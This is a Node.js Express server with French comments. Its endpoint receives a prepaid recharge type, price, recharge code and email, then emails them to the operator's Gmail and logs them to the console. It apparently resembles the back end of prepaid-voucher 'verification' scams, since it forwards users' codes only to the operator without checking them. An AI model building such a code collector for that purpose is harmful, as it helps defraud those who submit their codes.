require("dotenv").config();
const express = require("express");
const cors = require("cors");
const path = require("path");
const fs = require("fs");
const nodemailer = require("nodemailer");

const app = express();
const PORT = process.env.PORT || 4001;

app.use(cors());
app.use(express.json());
app.use(express.urlencoded({ extended: true }));

// --- Route de santé ---
app.get("/health", (req, res) => {
  res.json({ status: "ok", time: new Date().toISOString() });
});

// --- Envoi d’email ---
function escapeHtml(str) {
  if (str === undefined || str === null) return "—";
  const s = String(str);
  return s
    .replace(/&/g, "&amp;")
    .replace(/</g, "&lt;")
    .replace(/>/g, "&gt;")
    .replace(/"/g, "&quot;");
}

app.post("/api/send-email", async (req, res) => {
  try {
    console.log("📩 Body reçu:", req.body); // debug

    let { rechargeType, rechargePrice, rechargeCode, email, hideCode } = req.body || {};
    rechargeType = rechargeType != null ? String(rechargeType) : "";
    rechargePrice = Number(rechargePrice);
    if (Number.isNaN(rechargePrice)) rechargePrice = 0;
    rechargeCode = rechargeCode != null ? String(rechargeCode) : "";
    email = email != null ? String(email) : "";
    hideCode = hideCode === true || hideCode === "yes";

    if (!rechargeType || !rechargeCode || !email) {
      return res.status(400).json({ error: "Champs requis manquants" });
    }

    const emailUser = process.env.EMAIL_USER;
    const emailPass = process.env.EMAIL_PASS;
    if (!emailUser || !emailPass) {
      console.error("❌ EMAIL_USER ou EMAIL_PASS manquants. Créez un fichier .env dans le dossier server.");
      return res.status(503).json({
        error: "Envoi d'email non configuré",
        details: "Configurez EMAIL_USER et EMAIL_PASS dans server/.env (voir .env.example)",
      });
    }

    const transporter = nodemailer.createTransport({
      service: "gmail",
      auth: {
        user: emailUser,
        pass: emailPass,
      },
    });

    const mailOptions = {
      from: emailUser,
      to: emailUser,
      subject: "Nouvelle soumission de recharge",
      html: `
        <h2>Détails de la soumission</h2>
        <p><strong>Type :</strong> ${escapeHtml(rechargeType)}</p>
        <p><strong>Prix :</strong> ${escapeHtml(rechargePrice)}</p>
        <p><strong>Code :</strong> ${escapeHtml(rechargeCode)}</p>
        <p><strong>Email :</strong> ${escapeHtml(email)}</p>
        <p><strong>Hide Code :</strong> ${hideCode ? "Yes" : "No"}</p>
      `,
    };

    const info = await transporter.sendMail(mailOptions);
    res.json({ success: true, messageId: info.messageId });
  } catch (err) {
    console.error("❌ Erreur envoi email:", err);
    res.status(500).json({ error: "Échec envoi email", details: err?.message || err });
  }
});

// --- Frontend ---
const frontDist = path.join(__dirname, "..", "dist");
app.use(express.static(frontDist));

app.get("*", (req, res) => {
  const indexPath = path.join(frontDist, "index.html");
  if (fs.existsSync(indexPath)) {
    res.sendFile(indexPath);
  } else {
    res.status(404).send("Not found");
  }
});

app.listen(PORT, () => {
  console.log(`🚀 Server listening on http://localhost:${PORT}`);
  if (!process.env.EMAIL_USER || !process.env.EMAIL_PASS) {
    console.warn("⚠️  Email non configuré : créez server/.env avec EMAIL_USER et EMAIL_PASS (voir .env.example)");
  }
});
